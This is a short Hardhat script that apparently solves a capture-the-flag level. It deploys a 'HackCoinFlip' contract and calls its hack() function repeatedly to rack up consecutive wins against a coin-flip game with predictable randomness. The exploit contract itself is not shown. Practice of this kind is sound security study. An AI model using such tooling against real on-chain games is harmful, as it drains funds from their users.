const main = async () => {
  const hackCoinFlipFactory = await hre.ethers.getContractFactory("HackCoinFlip"),
  hackContract = await hackCoinFlipFactory.deploy();
  await hackContract.deployed();
  console.log("Contract deployed to: " + hackContract.address);

  for(let i = 0; i <= 10; i++){
    let txn = await hackContract.hack();
    await txn.wait();
    console.log("Total wins: " + hackContract.consecutiveWins());
  }
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
